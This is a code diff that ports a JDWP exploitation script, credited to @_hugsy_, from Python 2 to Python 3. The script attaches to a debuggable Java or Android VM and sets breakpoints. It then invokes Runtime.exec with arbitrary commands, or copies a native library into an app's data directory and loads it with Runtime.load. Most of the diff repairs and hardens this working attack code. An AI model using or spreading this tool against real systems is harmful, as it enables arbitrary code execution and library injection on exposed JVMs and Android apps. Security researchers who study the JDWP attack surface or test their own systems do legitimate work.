@@ -11,6 +11,7 @@
 #
 
 import argparse
+from collections import deque
 import json
 import logging
 import logging.config
@@ -20,13 +21,30 @@ import struct
 import sys
 import time
 import traceback
-import urllib
+
+logger = logging.getLogger('jdwp')
+
+
+def pack_byte(value):
+    return struct.pack('>B', value)
+
+
+def recv_exact(sock, size):
+    chunks = []
+    remaining = size
+    while remaining:
+        data = sock.recv(remaining)
+        if not data:
+            raise EOFError('JDWP connection closed with %d bytes missing' % remaining)
+        chunks.append(data)
+        remaining -= len(data)
+    return b''.join(chunks)
 
 ################################################################################
 #
 # JDWP protocol variables
 #
-HANDSHAKE = "JDWP-Handshake"
+HANDSHAKE = b"JDWP-Handshake"
 
 REQUEST_PACKET_TYPE = 0x00
 REPLY_PACKET_TYPE = 0x80
@@ -88,31 +106,39 @@ class JDWPClient:
         self.socket = None
         self.classes = []
         self.threads = []
+        self.request_id = None
+        self.replies = {}
+        self.events = deque()
 
-    def create_packet(self, cmd_sig, data=""):
+    def create_packet(self, cmd_sig, data=b""):
         flags = 0x00
         cmd_set, cmd = cmd_sig
         pkt_len = len(data) + 11
-        pkt = struct.pack(">IIccc", pkt_len, self.id, chr(flags), chr(cmd_set), chr(cmd))
+        pkt = struct.pack(">IIBBB", pkt_len, self.id, flags, cmd_set, cmd)
         pkt += data
+        self.request_id = self.id
         self.id += 2
         return pkt
 
-    def read_reply(self):
-        header = self.socket.recv(11)
-        pkt_len, id, flags, errcode = struct.unpack(">IIcH", header)
+    def read_packet(self):
+        header = recv_exact(self.socket, 11)
+        length, packet_id, flags, code = struct.unpack(">IIBH", header)
+        if length < 11:
+            raise ValueError('Invalid JDWP packet length %d' % length)
+        return packet_id, flags, code, recv_exact(self.socket, length - 11)
 
-        if flags == chr(REPLY_PACKET_TYPE):
-            if errcode:
-                logger.error("Received errcode %d" % errcode)
-                raise Exception("Received errcode %d" % errcode)
-        buf = ""
-        while len(buf) + 11 < pkt_len:
-            data = self.socket.recv(1024)
-            if len(data):
-                buf += data
+    def read_reply(self):
+        # VM events can arrive between replies, and Runtime.load is invoked
+        # asynchronously. Keep packet boundaries and match command IDs.
+        while self.request_id not in self.replies:
+            packet_id, flags, code, buf = self.read_packet()
+            if flags == REPLY_PACKET_TYPE:
+                self.replies[packet_id] = (code, buf)
             else:
-                time.sleep(1)
+                self.events.append(buf)
+        code, buf = self.replies.pop(self.request_id)
+        if code:
+            raise RuntimeError('JDWP reply error %d' % code)
         return buf
 
     def parse_entries(self, buf, formats, explicit=True):
@@ -135,21 +161,21 @@ class JDWPClient:
                     index += 4
                 elif fmt == 'S':
                     l = struct.unpack(">I", buf[index:index + 4])[0]
-                    data[name] = buf[index + 4:index + 4 + l]
+                    data[name] = buf[index + 4:index + 4 + l].decode('utf-8', 'replace')
                     index += 4 + l
                 elif fmt == 'C':
-                    data[name] = ord(struct.unpack(">c", buf[index])[0])
+                    data[name] = struct.unpack(">B", buf[index:index + 1])[0]
                     index += 1
                 elif fmt == 'Z':
-                    t = ord(struct.unpack(">c", buf[index])[0])
+                    t = struct.unpack(">B", buf[index:index + 1])[0]
                     if t == 115:
-                        s = self.solve_string(buf[index + 1:index + 9])
+                        end = index + 1 + self.objectIDSize
+                        s = self.solve_string(buf[index + 1:end])
                         data[name] = s
-                        index += 9
+                        index = end
                     elif t == 73:
                         data[name] = struct.unpack(">I", buf[index + 1:index + 5])[0]
-                        buf = struct.unpack(">I", buf[index + 5:index + 9])
-                        index = 0
+                        index += 5
                 else:
                     logger.error("error")
                     sys.exit(1)
@@ -186,9 +212,10 @@ class JDWPClient:
         except socket.error as msg:
             logger.error("Failed to connect: %s" % msg)
             raise Exception("Failed to connect: %s" % msg)
-        s.send(HANDSHAKE)
+        s.sendall(HANDSHAKE)
 
-        if s.recv(len(HANDSHAKE)) != HANDSHAKE:
+        if recv_exact(s, len(HANDSHAKE)) != HANDSHAKE:
+            s.close()
             logger.error("Failed to handshake, Please close AndroidStudio, UE4 and other programs that may occupy ADB before using this program")
             raise Exception("Failed to handshake")
         else:
@@ -203,7 +230,7 @@ class JDWPClient:
         formats = [('S', "description"), ('I', "jdwpMajor"), ('I', "jdwpMinor"),
                    ('S', "vmVersion"), ('S', "vmName"), ]
         for entry in self.parse_entries(buf, formats, False):
-            for name, value in entry.iteritems():
+            for name, value in entry.items():
                 setattr(self, name, value)
 
     @property
@@ -216,7 +243,7 @@ class JDWPClient:
         formats = [("I", "fieldIDSize"), ("I", "methodIDSize"), ("I", "objectIDSize"),
                    ("I", "referenceTypeIDSize"), ("I", "frameIDSize")]
         for entry in self.parse_entries(buf, formats, False):
-            for name, value in entry.iteritems():
+            for name, value in entry.items():
                 setattr(self, name, value)
 
     def all_threads(self):
@@ -242,7 +269,6 @@ class JDWPClient:
     def all_classes(self):
         self.socket.sendall(self.create_packet(ALLCLASSES_SIG))
         buf = self.read_reply()
-        logger.error(buf)
         formats = [('C', "refTypeTag"),
                    (self.referenceTypeIDSize, "refTypeId"),
                    ('S', "signature"),
@@ -257,7 +283,7 @@ class JDWPClient:
         return None
 
     def get_methods(self, ref_type_id):
-        if not self.methods.has_key(ref_type_id):
+        if ref_type_id not in self.methods:
             ref_id = self.format(self.referenceTypeIDSize, ref_type_id)
             self.socket.sendall(self.create_packet(METHODS_SIG, data=ref_id))
             buf = self.read_reply()
@@ -276,7 +302,7 @@ class JDWPClient:
         return None
 
     def get_file_id(self, ref_type_id):
-        if not self.fields.has_key(refTypeId):
+        if ref_type_id not in self.fields:
             ref_id = self.format(self.referenceTypeIDSize, ref_type_id)
             self.socket.sendall(self.create_packet(FIELDS_SIG, data=ref_id))
             buf = self.read_reply()
@@ -304,11 +330,13 @@ class JDWPClient:
         return self.parse_entries(buf, [(self.objectIDSize, "objId")], False)
 
     def buildstring(self, data):
+        if not isinstance(data, bytes):
+            data = data.encode('utf-8')
         return struct.pack(">I", len(data)) + data
 
     def readstring(self, data):
         size = struct.unpack(">I", data[:4])[0]
-        return data[4:4 + size]
+        return data[4:4 + size].decode('utf-8', 'replace')
 
     def suspendvm(self):
         self.socket.sendall(self.create_packet(SUSPENDVM_SIG))
@@ -383,13 +411,12 @@ class JDWPClient:
         return self.query_thread(thread_id, THREADRESUME_SIG)
 
     def send_event(self, event_code, *args):
-        data = ""
-        data += chr(event_code)
-        data += chr(SUSPEND_ALL)
+        data = pack_byte(event_code)
+        data += pack_byte(SUSPEND_ALL)
         data += struct.pack(">I", len(args))
 
         for kind, option in args:
-            data += chr(kind)
+            data += pack_byte(kind)
             data += option
 
         self.socket.sendall(self.create_packet(EVENTSET_SIG, data=data))
@@ -397,7 +424,7 @@ class JDWPClient:
         return struct.unpack(">I", buf)[0]
 
     def clear_event(self, event_code, r_id):
-        data = chr(event_code)
+        data = pack_byte(event_code)
         data += struct.pack(">I", r_id)
         self.socket.sendall(self.create_packet(EVENTCLEAR_SIG, data=data))
         self.read_reply()
@@ -409,11 +436,17 @@ class JDWPClient:
         return
 
     def wait_for_event(self):
-        buf = self.read_reply()
-        return buf
+        while not self.events:
+            packet_id, flags, code, buf = self.read_packet()
+            if flags == REPLY_PACKET_TYPE:
+                self.replies[packet_id] = (code, buf)
+            else:
+                self.events.append(buf)
+        return self.events.popleft()
 
     def parse_event_breakpoint(self, buf, event_id):
-        num = struct.unpack(">I", buf[2:6])[0]
+        if len(buf) < 10 or buf[5:6] != pack_byte(EVENT_BREAKPOINT):
+            return None
         r_id = struct.unpack(">I", buf[6:10])[0]
         if r_id != event_id:
             return None
@@ -455,7 +488,7 @@ def runtime_exec(jdwp, args):
         logger.error("[-] Could not access method '%s'" % args.break_on)
         return False
 
-    loc = chr(TYPE_CLASS)
+    loc = pack_byte(TYPE_CLASS)
     loc += jdwp.format(jdwp.referenceTypeIDSize, c["refTypeId"])
     loc += jdwp.format(jdwp.methodIDSize, m["methodId"])
     loc += struct.pack(">II", 0, 0)
@@ -480,22 +513,28 @@ def runtime_exec(jdwp, args):
 
     # 5. Now we can execute any code
     if args.cmd:
-        runtime_exec_payload(jdwp, t_id, runtime_class["refTypeId"], runtime_method["methodId"], args.cmd)
+        if not runtime_exec_payload(jdwp, t_id, runtime_class["refTypeId"], runtime_method["methodId"], args.cmd):
+            return False
     elif args.loadlib:
         package_name = get_package_name(jdwp, t_id)
+        if not package_name:
+            return False
         tmp_location = "/data/local/tmp/" + args.loadlib
         dst_location = "/data/data/" + package_name + "/" + args.loadlib
         command = "cp " + tmp_location + " " + dst_location
         logger.info("[*] Copying library from " + tmp_location + " to " + dst_location)
-        runtime_exec_payload(jdwp, t_id, runtime_class["refTypeId"], runtime_method["methodId"], command)
+        if not runtime_exec_payload(jdwp, t_id, runtime_class["refTypeId"], runtime_method["methodId"], command):
+            return False
         time.sleep(2)
         logger.info("[*] Executing Runtime.load(" + dst_location + ")")
-        runtime_load_payload(jdwp, t_id, runtime_class["refTypeId"], runtime_method["methodId"], dst_location)
+        if not runtime_load_payload(jdwp, t_id, runtime_class["refTypeId"], runtime_method["methodId"], dst_location):
+            return False
         time.sleep(2)
         logger.info("[*] Library should now be loaded")
     else:
         # by default, only prints out few system properties
-        runtime_exec_info(jdwp, tId)
+        if not runtime_exec_info(jdwp, t_id):
+            return False
     jdwp.resume_vm()
     logger.info("[!] Command successfully executed")
     return True
@@ -536,7 +575,7 @@ def runtime_exec_info(jdwp, thread_id):
                   }
 
     system_class = jdwp.get_class_by_name("Ljava/lang/System;")
-    if systemClass is None:
+    if system_class is None:
         logger.error("[-] Cannot find class java.lang.System")
         return False
 
@@ -546,23 +585,23 @@ def runtime_exec_info(jdwp, thread_id):
         logger.error("[-] Cannot find method System.getProperty()")
         return False
 
-    for prop_str, prop_desc in properties.iteritems():
+    for prop_str, prop_desc in properties.items():
         prop_obj_ids = jdwp.create_string(prop_str)
         if len(prop_obj_ids) == 0:
             logger.error("[-] Failed to allocate command")
             return False
         prop_obj_id = prop_obj_ids[0]["objId"]
 
-        data = [chr(TAG_OBJECT) + jdwp.format(jdwp.objectIDSize, prop_obj_id), ]
-        buf = jdwp.invoke_static(systemClass["refTypeId"],
+        data = [pack_byte(TAG_OBJECT) + jdwp.format(jdwp.objectIDSize, prop_obj_id), ]
+        buf = jdwp.invoke_static(system_class["refTypeId"],
                                 thread_id,
                                 get_property_method["methodId"],
                                 *data)
-        if buf[0] != chr(TAG_STRING):
+        if buf[:1] != pack_byte(TAG_STRING):
             logger.info("[-] %s: Unexpected returned type: expecting String" % prop_str)
         else:
             ret_id = jdwp.unformat(jdwp.objectIDSize, buf[1:1 + jdwp.objectIDSize])
-            res = cli.solve_string(jdwp.format(jdwp.objectIDSize, ret_id))
+            res = jdwp.solve_string(jdwp.format(jdwp.objectIDSize, ret_id))
             logger.info("[+] Found %s '%s'" % (prop_desc, res))
     return True
 
@@ -584,7 +623,7 @@ def runtime_exec_payload(jdwp, thread_id, runtime_class_id, runtime_method_id, c
 
     # 2. use context to get Runtime object
     buf = jdwp.invoke_static(runtime_class_id, thread_id, runtime_method_id)
-    if buf[0] != chr(TAG_OBJECT):
+    if buf[:1] != pack_byte(TAG_OBJECT):
         logger.error("[-] Unexpected returned type: expecting Object")
         return False
     rt = jdwp.unformat(jdwp.objectIDSize, buf[1:1 + jdwp.objectIDSize])
@@ -602,9 +641,9 @@ def runtime_exec_payload(jdwp, thread_id, runtime_class_id, runtime_method_id, c
     logger.info("[+] found Runtime.exec(): id=%x" % exec_method["methodId"])
 
     # 4. call exec() in this context with the alloc-ed string
-    data = [chr(TAG_OBJECT) + jdwp.format(jdwp.objectIDSize, cmd_obj_id)]
+    data = [pack_byte(TAG_OBJECT) + jdwp.format(jdwp.objectIDSize, cmd_obj_id)]
     buf = jdwp.invoke(rt, thread_id, runtime_class_id, exec_method["methodId"], *data)
-    if buf[0] != chr(TAG_OBJECT):
+    if buf[:1] != pack_byte(TAG_OBJECT):
         logger.error("[-] Unexpected returned type: expecting Object")
         return False
     logger.info("[+] Runtime.exec() successful, retId=%x" % jdwp.unformat(jdwp.objectIDSize, buf[1:1 + jdwp.objectIDSize]))
@@ -635,7 +674,7 @@ def get_package_name(jdwp, thread_id):
 
     buf = jdwp.invoke_static(
         activity_thread_class["refTypeId"], thread_id, get_context_method["methodId"])
-    if buf[0] != chr(TAG_OBJECT):
+    if buf[:1] != pack_byte(TAG_OBJECT):
         logger.error("[-] Unexpected returned type: expecting Object")
         return False
     rt = jdwp.unformat(jdwp.objectIDSize, buf[1:1 + jdwp.objectIDSize])
@@ -645,17 +684,18 @@ def get_package_name(jdwp, thread_id):
 
     # 3. find getPackageName() method
     get_package_name_method = jdwp.get_method_by_name("getPackageName")
-    if get_package_name is None:
+    if get_package_name_method is None:
         logger.error("[-] Cannot find method ActivityThread.currentApplication().getPackageName()")
         return False
 
     # 4. call getPackageNameMeth()
     buf = jdwp.invoke(rt, thread_id, context_wrapper_class["refTypeId"], get_package_name_method["methodId"])
-    if buf[0] != chr(TAG_STRING):
-        logger.info("[-] %s: Unexpected returned type: expecting String")
+    if buf[:1] != pack_byte(TAG_STRING):
+        logger.error("[-] getPackageName: Unexpected returned type: expecting String")
+        return False
     else:
         ret_id = jdwp.unformat(jdwp.objectIDSize, buf[1:1 + jdwp.objectIDSize])
-        res = cli.solve_string(jdwp.format(jdwp.objectIDSize, ret_id))
+        res = jdwp.solve_string(jdwp.format(jdwp.objectIDSize, ret_id))
         logger.info("[+] getPackageMethod(): '%s'" % res)
     return "%s" % res
 
@@ -677,7 +717,7 @@ def runtime_load_payload(jdwp, thread_id, runtime_class_id, runtime_method_id, l
 
     # 2. use context to get Runtime object
     buf = jdwp.invoke_static(runtime_class_id, thread_id, runtime_method_id)
-    if buf[0] != chr(TAG_OBJECT):
+    if buf[:1] != pack_byte(TAG_OBJECT):
         logger.error("[-] Unexpected returned type: expecting Object")
         return False
     rt = jdwp.unformat(jdwp.objectIDSize, buf[1:1 + jdwp.objectIDSize])
@@ -695,7 +735,7 @@ def runtime_load_payload(jdwp, thread_id, runtime_class_id, runtime_method_id, l
     # print("[+] found Runtime.load(): id=%x" % loadMeth["methodId"])
 
     # 4. call exec() in this context with the alloc-ed string
-    data = [chr(TAG_OBJECT) + jdwp.format(jdwp.objectIDSize, cmd_obj_id)]
+    data = [pack_byte(TAG_OBJECT) + jdwp.format(jdwp.objectIDSize, cmd_obj_id)]
     jdwp.invoke_void(rt, thread_id, runtime_class_id, load_method["methodId"], *data)
     logger.info("[+] Runtime.load(%s) probably successful" % library)
     return True
@@ -721,8 +761,6 @@ def setup_logging(default_path='logging.json', default_level=logging.INFO):
 
 if __name__ == "__main__":
     logger = setup_logging(default_path=os.path.join(os.getcwd(), 'logging.json'))
-    if sys.version > '3':
-        logger.error("Currently only supports python2!")
     parser = argparse.ArgumentParser(description="Universal exploitation script for JDWP by @_hugsy_",
                                      formatter_class=argparse.ArgumentDefaultsHelpFormatter)
 
